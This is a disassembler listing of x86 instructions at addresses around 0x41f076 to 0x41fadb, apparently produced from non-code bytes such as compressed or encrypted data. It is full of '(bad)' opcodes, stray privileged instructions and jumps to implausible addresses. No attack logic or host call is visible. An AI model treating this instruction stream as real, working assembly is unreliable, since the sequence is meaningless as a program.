  41f076:	push   esi
  41f077:	pusha  
  41f078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f079:	xchg   ebx,eax
  41f07a:	dec    edx
  41f07b:	dec    esp
  41f07c:	mov    ds:0xaccb99d3,al
  41f081:	icebp  
  41f082:	cld    
  41f083:	push   esi
  41f084:	pop    esi
  41f085:	xor    BYTE PTR ds:0x5ac113a5,al
  41f08b:	cli    
  41f08c:	mov    ch,cl
  41f08e:	inc    ecx
  41f08f:	into   
  41f090:	mov    esp,0xecf99b80
  41f095:	inc    ebx
  41f096:	push   ds
  41f097:	sub    al,0x9f
  41f099:	jo     0x41f097
  41f09b:	sub    eax,esi
  41f09d:	jmp    0x883d8670
  41f0a2:	test   eax,0xdbe283b5
  41f0a7:	into   
  41f0a8:	call   0x6004:0x529b2172
  41f0af:	dec    ebp
  41f0b0:	(bad)  
  41f0b1:	les    ebx,FWORD PTR [ebx]
  41f0b3:	les    esi,FWORD PTR [edx-0x53]
  41f0b6:	dec    eax
  41f0b7:	int    0x8c
  41f0b9:	xor    al,0x7e
  41f0bb:	pop    esp
  41f0bc:	cmp    eax,0xe55e4a16
  41f0c1:	fld    TBYTE PTR [edi-0x51a76aef]
  41f0c7:	dec    eax
  41f0c8:	dec    ecx
  41f0c9:	(bad)  
  41f0ca:	xchg   edx,eax
  41f0cb:	add    al,0x16
  41f0cd:	fistp  DWORD PTR [ecx+0x3ba31154]
  41f0d3:	fisttp WORD PTR [edx-0x336babb1]
  41f0d9:	call   0x42ad4b57
  41f0de:	sar    dl,cl
  41f0e0:	jp     0x41f063
  41f0e2:	nop
  41f0e3:	or     ch,ah
  41f0e5:	xor    ecx,DWORD PTR [esi+0x4b]
  41f0e8:	adc    ch,BYTE PTR [edx+0x56]
  41f0eb:	xor    eax,0x19037b64
  41f0f0:	add    DWORD PTR fs:[ebx],esp
  41f0f3:	dec    esi
  41f0f4:	dec    esi
  41f0f5:	pushf  
  41f0f6:	retf   
  41f0f7:	add    eax,DWORD PTR [ebx]
  41f0f9:	sub    BYTE PTR [ecx+ecx*1],0xaa
  41f0fd:	outs   dx,DWORD PTR ds:[esi]
  41f0fe:	inc    esp
  41f0ff:	adc    eax,0xb626d22f
  41f104:	pushf  
  41f105:	gs pop ss
  41f107:	and    BYTE PTR [esi-0x4a],bh
  41f10a:	sbb    DWORD PTR [edi+ecx*4-0x4c0b89c3],esi
  41f111:	sbb    DWORD PTR [ebx],ecx
  41f113:	add    edi,ebp
  41f115:	pop    edi
  41f116:	or     dl,BYTE PTR [esp+edi*4+0x42]
  41f11a:	xchg   esp,eax
  41f11b:	jl     0x41f0d9
  41f11d:	fimul  WORD PTR cs:[esi]
  41f120:	(bad)  
  41f121:	push   ecx
  41f122:	arpl   WORD PTR [eax+eax*4-0x1d],ax
  41f126:	cmc    
  41f127:	pop    ds
  41f128:	jge    0x41f15f
  41f12a:	je     0x41f161
  41f12c:	or     esp,DWORD PTR [edx+0x5ebf41a6]
  41f132:	cmp    eax,0x55e864b7
  41f137:	inc    ebp
  41f138:	inc    ebp
  41f139:	out    dx,eax
  41f13a:	ja     0x41f0bd
  41f13c:	sbb    bh,ah
  41f13e:	jne    0x41f19d
  41f140:	add    eax,DWORD PTR [eax]
	...
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	stos   DWORD PTR es:[edi],eax
  41f1b5:	add    dh,BYTE PTR [edi-0x1a]
  41f1b8:	push   edi
  41f1ba:	mov    ebx,0xee13144f
  41f1bf:	mov    edi,ebp
  41f1c1:	mov    cl,0x5
  41f1c3:	sbb    ebp,ebx
  41f1c5:	dec    ebp
  41f1c6:	add    DWORD PTR [eax],eax
  41f1c8:	cmc    
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [edx-0x627433e4],dh
  41f1d1:	outs   dx,DWORD PTR ds:[esi]
  41f1d3:	mov    esp,0x470c20f1
  41f1d8:	xor    eax,0x8be45594
  41f1dd:	jmp    DWORD PTR ds:0x2a4c3a6b
  41f1e3:	outs   dx,BYTE PTR ds:[esi]
  41f1e4:	imul   esp,edi,0xffffff8f
  41f1e7:	and    al,0x5d
  41f1e9:	rcr    BYTE PTR [esi-0x28],0xfd
  41f1ed:	mov    al,0x45
  41f1ef:	xlat   BYTE PTR ds:[ebx]
  41f1f0:	jae    0x41f21b
  41f1f2:	cmp    al,0x3b
  41f1f4:	cmp    dh,ah
  41f1f6:	mov    edi,0xb62b58f3
  41f1fb:	sar    ecx,1
  41f1fd:	(bad)  
  41f1fe:	jle    0x41f1df
  41f200:	mov    edi,esi
  41f202:	fwait
  41f203:	ins    DWORD PTR es:[edi],dx
  41f204:	repz xor eax,0xf47cad91
  41f20a:	or     al,0xc2
  41f20c:	in     eax,0xfa
  41f20e:	push   esp
  41f20f:	pop    es
  41f210:	daa    
  41f211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f212:	xchg   edi,eax
  41f213:	jno    0x41f286
  41f215:	(bad)  
  41f216:	call   0x4a7d055b
  41f21b:	cmp    BYTE PTR [edx+0x31401bf1],al
  41f221:	in     eax,dx
  41f222:	(bad)  
  41f223:	iret   
  41f224:	rcl    BYTE PTR [ebp+0x5],1
  41f227:	imul   eax,DWORD PTR [ecx],0xffffff82
  41f22a:	xchg   edi,eax
  41f22b:	test   ah,bl
  41f22d:	rcl    BYTE PTR [ecx+0x4d],1
  41f230:	jmp    0x6185:0x5939ee0d
  41f237:	lds    ebp,FWORD PTR [edx+0x7]
  41f23a:	mov    esp,0x9b700e2d
  41f23f:	fisttp WORD PTR [edi]
  41f241:	ins    BYTE PTR es:[edi],dx
  41f242:	or     esp,DWORD PTR [ecx-0x7b]
  41f245:	pushf  
  41f246:	icebp  
  41f247:	popa   
  41f248:	frstor [eax]
  41f24a:	adc    eax,0x2e9349e4
  41f24f:	mul    BYTE PTR [ebx-0x1b]
  41f252:	jp     0x41f1df
  41f254:	mov    edx,0xb9a4ac25
  41f259:	es push edx
  41f25b:	push   ebp
  41f25c:	lds    esp,FWORD PTR [ebp-0x67bc5f5c]
  41f262:	aad    0x28
  41f264:	dec    edx
  41f265:	int    0x2e
  41f267:	fiadd  WORD PTR ds:0x5eef2fed
  41f26d:	push   ds
  41f26e:	jns    0x41f23a
  41f270:	ins    BYTE PTR es:[edi],dx
  41f271:	pop    ecx
  41f272:	call   0x4b46:0x8d75ac2e
  41f279:	dec    eax
  41f27a:	sbb    eax,0xf807a4f6
  41f27f:	call   0xa5953077
  41f284:	iret   
  41f285:	or     dh,al
  41f287:	jbe    0x41f2dd
  41f289:	fwait
  41f28a:	(bad)  
  41f28b:	jnp    0x41f250
  41f28d:	setne  BYTE PTR [ecx+ebx*1+0x6d57547b]
  41f295:	mov    ebx,0x31e64f0d
  41f29a:	xor    al,0xc3
  41f29c:	cs pop ss
  41f29e:	popf   
  41f29f:	add    ebx,DWORD PTR [edi-0x30f928e1]
  41f2a5:	into   
  41f2a6:	xlat   BYTE PTR ds:[ebx]
  41f2a7:	sar    BYTE PTR [edx-0x741bd7c0],0xc0
  41f2ae:	adc    bl,BYTE PTR [edi-0x7a]
  41f2b1:	sbb    ebx,DWORD PTR [eax+edx*2]
  41f2b4:	test   DWORD PTR [edx-0x2a],esp
  41f2b7:	pop    ebx
  41f2b8:	ins    BYTE PTR es:[edi],dx
  41f2b9:	in     eax,0x5
  41f2bb:	jns    0x41f26a
  41f2bd:	or     al,0x95
  41f2bf:	stos   DWORD PTR es:[edi],eax
  41f2c0:	out    dx,al
	...
  41f331:	add    BYTE PTR [eax],al
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0xd97f:0x4d9531a0
  41f343:	xchg   ebp,eax
  41f344:	ror    BYTE PTR [esi+0x1],cl
  41f347:	add    ch,dh
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [ebx],ah
  41f34d:	push   0xe4d5c00
  41f352:	dec    esp
  41f353:	xchg   edi,eax
  41f354:	(bad)  
  41f355:	stc    
  41f356:	stos   DWORD PTR es:[edi],eax
  41f357:	idiv   DWORD PTR [edx]
  41f359:	nop
  41f35a:	push   esp
  41f35b:	xchg   ebx,eax
  41f35c:	jge    0x41f311
  41f35e:	xor    eax,0xdf04a732
  41f363:	loop   0x41f3a8
  41f365:	aaa    
  41f366:	add    BYTE PTR [eax-0x5ea6401d],dl
  41f36c:	fs (bad) 
  41f36e:	mov    ebp,0x29e29bb8
  41f373:	pop    esi
  41f374:	cs nop
  41f376:	ret    
  41f377:	imul   ecx,DWORD PTR [ebp+0x3d],0xffffff96
  41f37b:	fs push esp
  41f37d:	sub    ch,bl
  41f37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f380:	xchg   BYTE PTR [edi-0x6b97e245],bl
  41f386:	push   esi
  41f387:	add    eax,0x41375bcb
  41f38c:	mov    ah,bh
  41f38e:	out    0xd2,al
  41f390:	sbb    BYTE PTR [edi],dl
  41f392:	push   ss
  41f393:	arpl   WORD PTR [edx],ax
  41f395:	out    0x79,al
  41f397:	inc    esp
  41f398:	or     dl,BYTE PTR [eax-0x3f401c3c]
  41f39e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a0:	mov    edi,0xfb8bd8ec
  41f3a5:	sti    
  41f3a6:	sub    bl,BYTE PTR [eax+0x4e9ee0aa]
  41f3ac:	pop    esp
  41f3ad:	mov    al,0xc8
  41f3af:	fisubr WORD PTR [edi]
  41f3b1:	addr16 dec ecx
  41f3b3:	outs   dx,DWORD PTR ds:[esi]
  41f3b4:	(bad)  
  41f3b5:	maxps  xmm0,XMMWORD PTR [edi+0x67d6aead]
  41f3bc:	not    BYTE PTR [ebp+edi*1-0x53]
  41f3c0:	and    ch,BYTE PTR [edi+edi*8]
  41f3c3:	call   0xf6258878
  41f3c8:	repnz mov edx,0x505bd212
  41f3ce:	push   edx
  41f3cf:	nop    edx
  41f3d2:	les    esi,FWORD PTR [ecx-0x10f21804]
  41f3d8:	mov    BYTE PTR [esi-0x5b],bh
  41f3db:	xchg   BYTE PTR [ecx+0x4f],dh
  41f3de:	ss es mov dh,0x83
  41f3e2:	aas    
  41f3e3:	dec    ecx
  41f3e4:	inc    ebx
  41f3e5:	mov    edx,0x759e809a
  41f3ea:	js     0x41f3e6
  41f3ec:	shr    BYTE PTR [ecx],1
  41f3ee:	sbb    al,0x64
  41f3f0:	mov    eax,eax
  41f3f2:	add    BYTE PTR [ebx-0x6a],dh
  41f3f5:	shl    ebp,1
  41f3f7:	and    bh,dl
  41f3f9:	xor    ch,dl
  41f3fb:	push   ecx
  41f3fc:	cmp    DWORD PTR [esi],edi
  41f3fe:	add    esi,DWORD PTR [edx-0x645a6ee9]
  41f404:	or     BYTE PTR [ebp-0x51],ch
  41f407:	mov    edi,0x6147ca01
  41f40c:	loop   0x41f3b8
  41f40e:	ret    0xea70
  41f411:	in     al,0xcd
  41f413:	inc    esi
  41f414:	fild   DWORD PTR [esi-0x3]
  41f417:	mov    ch,0x7a
  41f419:	mov    eax,0x60cca96a
  41f41e:	jns    0x41f437
  41f420:	outs   dx,DWORD PTR ds:[esi]
  41f421:	scas   al,BYTE PTR es:[edi]
  41f422:	es repnz push 0xff385ac8
  41f429:	adc    eax,0x6e1cd1f5
  41f42e:	neg    BYTE PTR [ebp-0x4d]
  41f431:	mov    eax,ds:0x373907cd
  41f436:	loopne 0x41f41d
  41f438:	out    dx,eax
  41f439:	sbb    BYTE PTR [esi-0x2b],dl
  41f43c:	nop
  41f43d:	(bad)  
  41f43e:	faddp  st(2),st
  41f440:	test   BYTE PTR [eax],0x0
	...
  41f4b3:	add    BYTE PTR [eax],ah
  41f4b5:	push   0xffffffcb
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0x40
  41f4c1:	push   esi
  41f4c2:	jno    0x41f4c4
  41f4c4:	(bad)  
  41f4c5:	dec    edi
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	cmc    
  41f4c9:	add    BYTE PTR [eax],al
  41f4cb:	add    BYTE PTR [edx+0x70a5acd7],ch
  41f4d1:	sub    al,0x8a
  41f4d3:	pop    ss
  41f4d4:	sbb    bh,dl
  41f4d6:	cmp    ebx,DWORD PTR [ebx+0x71]
  41f4d9:	pop    edi
  41f4da:	dec    esi
  41f4db:	js     0x41f51e
  41f4dd:	push   ebx
  41f4de:	xchg   esp,eax
  41f4df:	leave  
  41f4e0:	hlt    
  41f4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e2:	mov    dl,0xcf
  41f4e4:	test   BYTE PTR ds:0xd699e18b,dh
  41f4ea:	(bad)  [ecx]
  41f4ec:	push   DWORD PTR [eax]
  41f4ee:	test   eax,0xe4eed95d
  41f4f3:	xchg   BYTE PTR [ecx],bl
  41f4f5:	test   dh,cl
  41f4f7:	mov    ds:0xf467b02c,al
  41f4fc:	(bad)  
  41f4fd:	xlat   BYTE PTR ds:[ebx]
  41f4fe:	xor    ecx,DWORD PTR [bp+0x76]
  41f502:	xor    al,dl
  41f504:	fist   WORD PTR [esi-0x6fe2c4c9]
  41f50a:	inc    ebx
  41f50b:	pop    ds
  41f50c:	shl    DWORD PTR [esi],1
  41f50e:	inc    edx
  41f50f:	fnstsw WORD PTR [esi]
  41f511:	ret    0x4247
  41f514:	jmp    0x41f4c3
  41f516:	sar    BYTE PTR [ebx],1
  41f518:	popf   
  41f519:	push   edi
  41f51a:	sbb    esp,DWORD PTR [ebp+0x3a066a35]
  41f520:	push   ebx
  41f521:	jmp    0xc4:0x83cc2805
  41f528:	xchg   esi,eax
  41f529:	ja     0x41f540
  41f52b:	push   cs
  41f52c:	pop    eax
  41f52d:	arpl   WORD PTR [ebx-0xe],bp
  41f530:	ins    BYTE PTR es:[edi],dx
  41f531:	bound  esp,QWORD PTR [ecx]
  41f533:	sahf   
  41f534:	neg    DWORD PTR [ecx]
  41f536:	ja     0x41f547
  41f538:	fisub  WORD PTR [edx*8+0x15bad7c]
  41f53f:	mov    DWORD PTR [ecx-0x35],eax
  41f542:	pop    ebx
  41f543:	mov    dh,ch
  41f545:	fcom   QWORD PTR [esi-0x60]
  41f548:	data16 ss jmp 0x41f55a
  41f54c:	ss dec edi
  41f54e:	(bad)  
  41f54f:	cli    
  41f550:	jnp    0x41f55d
  41f552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f553:	es jecxz 0x41f4e2
  41f556:	push   ebx
  41f557:	addr16 (bad) 
  41f559:	cs pop ds
  41f55b:	icebp  
  41f55c:	xchg   BYTE PTR [edx+0x1754c123],al
  41f562:	ss fmul st(1),st
  41f565:	out    0x6,al
  41f567:	cmp    dh,dl
  41f569:	mov    ecx,0x1728d727
  41f56e:	jb     0x41f56b
  41f570:	popf   
  41f571:	jno    0x41f512
  41f573:	(bad)  
  41f574:	pop    ss
  41f575:	sub    BYTE PTR [ecx+0xff63185],al
  41f57b:	xchg   esi,eax
  41f57c:	ja     0x41f5f9
  41f57e:	inc    ebp
  41f57f:	add    BYTE PTR [eax+eiz*1-0x33],bl
  41f583:	ffree  st(3)
  41f585:	cmp    BYTE PTR [edi-0x3d711f45],bl
  41f58b:	addr16 pop ebp
  41f58d:	iret   
  41f58e:	xor    cl,ch
  41f590:	push   0x308e5858
  41f595:	pop    edx
  41f596:	pop    ss
  41f597:	jmp    0x1681:0x6e27afc3
  41f59e:	pop    edi
  41f59f:	cld    
  41f5a0:	addr16 cmp eax,0x89071d37
  41f5a6:	push   cs
  41f5a7:	sbb    ah,0x7c
  41f5aa:	and    BYTE PTR [eax+0x461fa1a2],dl
  41f5b0:	cld    
  41f5b1:	addr16 jae 0x41f580
  41f5b4:	mov    al,ds:0xe85de10d
  41f5b9:	jecxz  0x41f548
  41f5bb:	jae    0x41f600
  41f5bd:	fnstsw WORD PTR [ebx]
  41f5bf:	xor    esp,DWORD PTR [eax+eax*1]
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0xcf01e835
  41f641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f642:	dec    eax
  41f643:	dec    edi
  41f644:	mov    esp,0xf5000150
  41f649:	add    BYTE PTR [eax],al
  41f64b:	add    BYTE PTR [esi],ah
  41f64d:	jmp    0x810e:0xf7eafdae
  41f654:	in     al,0xec
  41f656:	les    eax,FWORD PTR [ebp+0x9]
  41f659:	test   DWORD PTR [edx+edi*8+0x718844c9],ecx
  41f660:	add    bl,bh
  41f662:	mov    eax,0x2bc893ef
  41f667:	add    BYTE PTR [edi-0x6df83021],bh
  41f66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f66e:	mov    eax,DWORD PTR [edi+0x6f0ff2b0]
  41f674:	push   ecx
  41f675:	pop    ebp
  41f676:	push   ds
  41f677:	scas   eax,DWORD PTR es:[edi]
  41f678:	out    dx,eax
  41f679:	mov    ds:0x7b1939ca,eax
  41f67e:	xchg   ecx,eax
  41f67f:	cmp    eax,0xcac5fe45
  41f684:	adc    al,0x84
  41f686:	aas    
  41f687:	std    
  41f688:	or     eax,0x5cdd7d37
  41f68d:	sbb    ch,ch
  41f68f:	jg     0x41f6d5
  41f691:	dec    esi
  41f692:	cdq    
  41f693:	pop    DWORD PTR [ecx-0x4390ebef]
  41f699:	dec    eax
  41f69a:	stc    
  41f69b:	push   eax
  41f69c:	mov    ds,edx
  41f69e:	cwde   
  41f69f:	xor    DWORD PTR [ebx-0x4df319c3],0xffffffca
  41f6a6:	jo     0x41f6ba
  41f6a8:	(bad)  
  41f6aa:	inc    esi
  41f6ab:	outs   dx,BYTE PTR ds:[esi]
  41f6ac:	lods   al,BYTE PTR ds:[esi]
  41f6ad:	loope  0x41f6b7
  41f6af:	lahf   
  41f6b0:	nop
  41f6b1:	ds in  al,dx
  41f6b3:	adc    esi,DWORD PTR [eax]
  41f6b5:	sub    BYTE PTR [ecx-0x7a],bl
  41f6b8:	push   es
  41f6b9:	push   sp
  41f6bb:	sub    ah,bl
  41f6bd:	outs   dx,DWORD PTR ds:[esi]
  41f6be:	aaa    
  41f6bf:	rcr    DWORD PTR [edx+0x44],cl
  41f6c2:	gs int3 
  41f6c4:	sbb    BYTE PTR [ebp+ebp*1-0x59],0x6a
  41f6c9:	and    bl,BYTE PTR [eax+0x3c]
  41f6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6cd:	sub    ecx,DWORD PTR [ebp-0x4c]
  41f6d0:	push   ebp
  41f6d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6d2:	and    bl,BYTE PTR [esi+0x79]
  41f6d5:	pop    DWORD PTR [esi]
  41f6d7:	cmp    eax,0xa119f15a
  41f6dc:	daa    
  41f6dd:	pop    es
  41f6de:	add    BYTE PTR [ebx],bl
  41f6e0:	inc    ebp
  41f6e1:	or     ebp,esp
  41f6e3:	mov    ebp,0x108f825a
  41f6e8:	pop    edx
  41f6e9:	shr    BYTE PTR [eax-0xbe762df],0x36
  41f6f0:	xor    eax,0x2644a5ba
  41f6f5:	sbb    DWORD PTR [edi+0x322d5fb1],ebx
  41f6fb:	xchg   esp,eax
  41f6fc:	es es test ecx,esi
  41f700:	xor    BYTE PTR [edi-0x87b9187],ah
  41f706:	std    
  41f707:	fdivr  QWORD PTR [ecx]
  41f709:	lea    ebx,[edx]
  41f70b:	sub    DWORD PTR [edi],0xe578dcc7
  41f711:	inc    ebp
  41f712:	popf   
  41f713:	sub    cl,BYTE PTR [esi+eiz*1+0x49073937]
  41f71a:	ret    
  41f71b:	(bad)  
  41f71d:	push   ds
  41f71e:	sub    BYTE PTR [eax+0x6a20d972],al
  41f724:	inc    ebx
  41f725:	jo     0x41f748
  41f727:	or     eax,0x4acd3514
  41f72c:	mov    eax,0x9e0a4e16
  41f731:	push   edi
  41f732:	or     al,al
  41f734:	push   ebx
  41f735:	push   ss
  41f736:	std    
  41f737:	dec    ebp
  41f738:	adc    bl,BYTE PTR [edx]
  41f73a:	dec    ebp
  41f73b:	sbb    ecx,DWORD PTR [edx]
  41f73d:	jp     0x41f789
  41f73f:	adc    al,0x5f
	...
  41f7b1:	add    BYTE PTR [eax],al
  41f7b3:	add    BYTE PTR ds:0x9e5c8a39,ch
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	or     DWORD PTR [edi+0x32],ebp
  41f7c3:	push   esp
  41f7c4:	mov    cl,0x51
  41f7c6:	add    DWORD PTR [eax],eax
  41f7c8:	cmc    
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [eax-0x2196e8e8],bh
  41f7d1:	call   FWORD PTR [esi]
  41f7d3:	neg    DWORD PTR [edi+0x249a4d28]
  41f7d9:	mov    ebx,0x43e8dc16
  41f7de:	(bad)  
  41f7df:	ins    BYTE PTR es:[edi],dx
  41f7e0:	xchg   ebx,eax
  41f7e1:	mov    ah,0xef
  41f7e3:	dec    ecx
  41f7e4:	ror    dh,0xe3
  41f7e7:	xchg   ebp,eax
  41f7e8:	sbb    BYTE PTR [edx],al
  41f7ea:	dec    edx
  41f7eb:	popf   
  41f7ec:	push   0x58
  41f7ee:	or     eax,DWORD PTR [ecx+eax*2]
  41f7f1:	xchg   edx,eax
  41f7f2:	lock sahf 
  41f7f4:	xor    bh,BYTE PTR [ebx+eiz*4+0x32]
  41f7f8:	shr    BYTE PTR [ebp+ebp*2-0x704ac160],0x28
  41f800:	add    ecx,DWORD PTR [edi-0x6]
  41f803:	pusha  
  41f804:	sbb    eax,0xaaf21fff
  41f809:	add    DWORD PTR [ebx+0x1ae01fb6],eax
  41f80f:	pop    esi
  41f810:	sub    ebx,eax
  41f812:	push   ebp
  41f813:	mov    edx,DWORD PTR [ecx+esi*4+0x4ca8455a]
  41f81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f81b:	add    eax,0xcd74c917
  41f820:	mov    edx,0x3c711cff
  41f825:	add    DWORD PTR [eax],eax
  41f827:	xchg   DWORD PTR [eax],ebp
  41f829:	jle    0x41f870
  41f82b:	and    BYTE PTR [eax],al
  41f82d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f82e:	jnp    0x41f89f
  41f830:	cs inc edi
  41f832:	add    eax,0xd488f8dc
  41f837:	call   0x9e10:0x87506427
  41f83e:	imul   esi,DWORD PTR [ebx+0x5011f709],0x67077e31
  41f848:	(bad)  
  41f849:	mov    ecx,0x75245ddf
  41f84e:	in     eax,0xa8
  41f850:	cld    
  41f851:	in     al,dx
  41f852:	js     0x41f888
  41f854:	inc    edi
  41f855:	cmovnp edx,DWORD PTR [esp+ebx*2+0x4b]
  41f85a:	imul   esi,DWORD PTR [ecx+0x8],0xd5ec390a
  41f861:	inc    esi
  41f862:	sahf   
  41f863:	inc    ebp
  41f864:	push   ebp
  41f865:	fisub  DWORD PTR [ebx+0x37dd0914]
  41f86b:	and    eax,0xb2ef72ce
  41f870:	adc    ah,BYTE PTR [edx-0x2a34f223]
  41f876:	fadd   DWORD PTR [ebx+0x43]
  41f879:	clc    
  41f87a:	stc    
  41f87b:	sbb    ah,al
  41f87d:	shl    dl,cl
  41f87f:	push   cs
  41f880:	arpl   cx,si
  41f882:	ds retf 0xb573
  41f886:	inc    edx
  41f887:	jbe    0x41f827
  41f889:	sti    
  41f88a:	(bad)  
  41f88c:	mov    edi,0x8ca7aa08
  41f891:	jle    0x41f890
  41f893:	jno    0x41f8c9
  41f895:	push   ebp
  41f896:	and    al,0x11
  41f898:	cld    
  41f899:	mov    bh,0x7c
  41f89b:	cmp    dl,BYTE PTR cs:[esi+0x1d]
  41f89f:	out    dx,eax
  41f8a0:	mul    DWORD PTR [ebp+0x70]
  41f8a3:	pop    ecx
  41f8a4:	icebp  
  41f8a5:	outs   dx,BYTE PTR ds:[esi]
  41f8a6:	mov    ds:0x1540d5e1,al
  41f8ab:	jns    0x41f877
  41f8ad:	inc    edx
  41f8ae:	shr    BYTE PTR [ebx*2+0x139de9ec],cl
  41f8b5:	mov    al,ds:0x8e1f53a0
  41f8ba:	xchg   ebp,eax
  41f8bb:	inc    esp
  41f8bc:	mov    bh,0xac
  41f8be:	dec    edi
  41f8bf:	xchg   ecx,eax
  41f8c0:	dec    esi
	...
  41f931:	add    BYTE PTR [eax],al
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0x489ffef7
  41f941:	push   edx
  41f942:	mov    DWORD PTR ds:0x152a6,esp
  41f948:	cmc    
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [ecx-0x61bdfa6f],al
  41f951:	adc    edx,DWORD PTR [edx+0x14477fb1]
  41f957:	pop    es
  41f958:	pop    eax
  41f959:	std    
  41f95a:	xchg   ebp,eax
  41f95b:	mov    eax,ds:0xff2f25da
  41f960:	push   ebp
  41f961:	mov    dh,0x6d
  41f963:	mov    esi,0x62d58f26
  41f968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f969:	call   0x125da0f5
  41f96e:	and    al,0x96
  41f970:	ffreep st(5)
  41f972:	stos   BYTE PTR es:[edi],al
  41f973:	imul   edi,DWORD PTR [ebx],0x46b9cf29
  41f979:	add    edx,DWORD PTR [esi-0x562aa2ca]
  41f97f:	imul   edx,DWORD PTR [ecx],0xece92f9f
  41f985:	(bad)  
  41f986:	icebp  
  41f987:	sar    ah,0x1e
  41f98a:	jl     0x41f95e
  41f98c:	ror    DWORD PTR [edi+0x4],0xb1
  41f990:	jmp    0x41f927
  41f992:	mov    edx,0x7d72c9d1
  41f997:	add    eax,0x9ed6bcd9
  41f99c:	test   eax,0xcc8f3a27
  41f9a1:	ret    0x789e
  41f9a4:	and    eax,DWORD PTR [edi+0x51]
  41f9a7:	push   esp
  41f9a8:	fcmovbe st,st(4)
  41f9aa:	inc    eax
  41f9ab:	or     dh,BYTE PTR [eax-0x9]
  41f9ae:	repz jno 0x41f986
  41f9b1:	imul   esp,DWORD PTR [eax-0x3e],0xffffff9e
  41f9b5:	and    eax,0xe9d6097f
  41f9ba:	imul   edi,DWORD PTR [edi+0x758988c8],0xffffff89
  41f9c1:	addr16 pop ss
  41f9c3:	pop    ecx
  41f9c4:	and    BYTE PTR [ebx],dl
  41f9c6:	test   eax,0xc5dd23bc
  41f9cb:	fs add bh,cl
  41f9ce:	das    
  41f9cf:	xchg   ch,ah
  41f9d1:	cwde   
  41f9d2:	scas   eax,DWORD PTR es:[edi]
  41f9d3:	xchg   BYTE PTR [ebp+esi*2-0x11],bl
  41f9d7:	popa   
  41f9d8:	and    BYTE PTR [eax],0x27
  41f9db:	pop    ebx
  41f9dc:	(bad)  
  41f9dd:	sbb    ch,al
  41f9df:	sbb    BYTE PTR [eax-0x5f],dl
  41f9e2:	loope  0x41fa33
  41f9e4:	jno    0x41fa0a
  41f9e6:	(bad)  
  41f9e8:	retf   0xc307
  41f9eb:	loop   0x41f999
  41f9ed:	in     eax,dx
  41f9ee:	es loopne 0x41f9b3
  41f9f1:	stc    
  41f9f2:	pop    eax
  41f9f3:	shl    DWORD PTR ds:0x16f7ffa1,1
  41f9f9:	sub    al,0x97
  41f9fb:	mov    esp,0x42cc534c
  41fa00:	jo     0x41fa6d
  41fa02:	xor    BYTE PTR [ebp+0x1a],dh
  41fa05:	jl     0x41fa11
  41fa07:	push   0x60f8f086
  41fa0c:	cmc    
  41fa0d:	sbb    BYTE PTR [ebx+0x585e7b54],0xcf
  41fa14:	out    dx,al
  41fa15:	pop    esp
  41fa16:	pop    ds
  41fa17:	dec    esp
  41fa18:	cli    
  41fa19:	mov    es,edx
  41fa1b:	and    al,BYTE PTR [ecx]
  41fa1d:	and    al,0xcd
  41fa1f:	jg     0x41f9b1
  41fa21:	adc    cl,BYTE PTR [ecx]
  41fa23:	inc    edx
  41fa24:	jb     0x41fa1b
  41fa26:	pop    eax
  41fa27:	fwait
  41fa28:	stos   DWORD PTR es:[edi],eax
  41fa29:	loope  0x41faa0
  41fa2b:	cmp    DWORD PTR [esi-0x1],esi
  41fa2e:	xor    dh,dl
  41fa30:	mov    al,ds:0xd49bad35
  41fa35:	push   0xffffff9b
  41fa37:	std    
  41fa38:	pop    eax
  41fa39:	popa   
  41fa3a:	pop    esi
  41fa3b:	lods   al,BYTE PTR ds:[esi]
  41fa3c:	sbb    al,0x4f
  41fa3e:	dec    eax
  41fa3f:	jmp    0x0:0x26
	...
  41fab2:	add    BYTE PTR [eax],al
  41fab4:	adc    ch,BYTE PTR [edi]
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	jns    0x41fa85
  41fac2:	mov    esi,DWORD PTR [eax]
  41fac4:	fwait
  41fac5:	push   ebx
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	cmc    
  41fac9:	add    BYTE PTR [eax],al
  41facb:	add    BYTE PTR [ecx+0x17],ch
  41face:	xor    DWORD PTR [ecx+ebp*1+0x50],eax
  41fad2:	jno    0x41fb36
  41fad4:	out    0x45,al
  41fad6:	cld    
  41fad7:	add    BYTE PTR [esi+0x11],al
  41fada:	pop    ebp
  41fadb:	pop    eax
